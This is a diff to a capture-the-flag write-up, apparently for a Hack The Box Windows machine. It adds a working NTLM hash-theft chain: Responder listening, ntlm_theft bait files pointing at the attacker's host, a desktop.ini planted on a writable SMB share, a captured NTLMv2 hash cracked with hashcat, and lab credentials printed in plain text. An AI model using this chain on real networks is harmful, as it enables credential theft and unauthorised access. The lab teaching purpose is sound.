@@ -330,7 +330,7 @@ SMB         10.10.11.187    445    G0               Web             READ
 Accessing `Shared` share shows that it is empty:
 
 ```bash
-smbclient //10.10.11.187/Shared --user 'S.Moon' -password 'S@Ss!K@*t13'
+smbclient //10.10.11.187/Shared --user 'S.Moon' --password 'S@Ss!K@*t13'
 Password for [WORKGROUP\S.Moon]:
 Try "help" to get a list of possible commands.
 
@@ -340,6 +340,86 @@ smb: \> dir
 ```
 
 
+The `Shared` share name indicates that multiple users can probably access this share. In Windows, many files get automatically "executed" when they are placed inside a directory and that directory gets accessed. These files may point to a network share for a resource, forcing the machine to authenticate to access the resource. A tool called [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) creates several files that could potentially be used to steal the NTLMv2 hash of a user just by accessing a folder.
+
+1. Set up Resonder to intercept any potential authentication requests.
+
+```bash
+sudo responder -I tun0 -v
+```
+
+2. Clone the ntl_theft tool and create our malicious files.
+
+```bash
+git clone https://github.com/Greenwolf/ntlm_theft
+
+python3 ntlm_theft.py --generate all --server <kali_machine_ip> --filename htb
+
+Created: htb/htb.scf (BROWSE TO FOLDER)
+Created: htb/htb-(url).url (BROWSE TO FOLDER)
+Created: htb/htb-(icon).url (BROWSE TO FOLDER)
+Created: htb/htb.lnk (BROWSE TO FOLDER)
+Created: htb/htb.rtf (OPEN)
+Created: htb/htb-(stylesheet).xml (OPEN)
+Created: htb/htb-(fulldocx).xml (OPEN)
+Created: htb/htb.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: htb/htb-(includepicture).docx (OPEN)
+Created: htb/htb-(remotetemplate).docx (OPEN)
+Created: htb/htb-(frameset).docx (OPEN)
+Created: htb/htb-(externalcell).xlsx (OPEN)
+Created: htb/htb.wax (OPEN)
+Created: htb/htb.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: htb/htb.asx (OPEN)
+Created: htb/htb.jnlp (OPEN)
+Created: htb/htb.application (DOWNLOAD AND OPEN)
+Created: htb/htb.pdf (OPEN AND ALLOW)
+Created: htb/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: htb/Autorun.inf (BROWSE TO FOLDER)
+Created: htb/desktop.ini (BROWSE TO FOLDER)
+Generation Complete.
+```
+
+3. Inside the parentheses, the tool informs us as to what action is required to trigger the file. Let's start by focusing on those that require the least amount of interaction, just by browsing to that folder. Our next step is to upload all the files that have the `(BROWSE TO FOLDER)` requirement to the `Shared` share. It appers that only files with the `.ini` extension could be uploaded. 
+
+```bash
+smb: \> put desktop.ini
+putting file desktop.ini as \desktop.ini (0.2 kb/s) (average 0.2 kb/s)
+smb: \> dir
+  .                                   D        0  Sun Aug  4 18:04:48 2024
+  ..                                  D        0  Sun Aug  4 18:04:48 2024
+  desktop.ini                         A       47  Sun Aug  4 18:04:48 2024
+```
+
+4. We then get a hash from `responder`, which we can crack with `hashcat` to get some credentials.
+
+ ```bash
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:c8049249c5e0698e:5AEA6CF0865325C751C5C72D75A0E0DF:0101000000000000803912695DE6DA0139EA1BA1B4C256120000000002000800550046005200430001001E00570049004E002D00390034004F0046004500580048005300390059004D0004003400570049004E002D00390034004F0046004500580048005300390059004D002E0055004600520043002E004C004F00430041004C000300140055004600520043002E004C004F00430041004C000500140055004600520043002E004C004F00430041004C0007000800803912695DE6DA01060004000200000008003000300000000000000000000000003000002250370D1BCF36A14904EABBF9EB4B3F9333E18726ED8029FFD34CC63C0BE0D40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310036000000000000000000
+```
+
+Hashcat command:
+
+```bash
+hashcat64.exe -m 5600 hash.txt rockyou.txt -o cracked.txt
+```
+
+New Credentials: `c.bum:Tikkycoll_431012284`
+
+We can then get the user flag via the `Users` SMB share:
+
+```bash
+smbclient //10.10.11.187/Users --user 'c.bum' --password 'Tikkycoll_431012284'
+
+smb: \C.Bum\Desktop\> dir
+  .                                  DR        0  Thu Sep 22 21:17:02 2022
+  ..                                 DR        0  Thu Sep 22 21:17:02 2022
+  user.txt                           AR       34  Sun Aug  4 17:51:15 2024
+```
+
+# Root Flag
+
+## Privilege Escalation
 
 
 
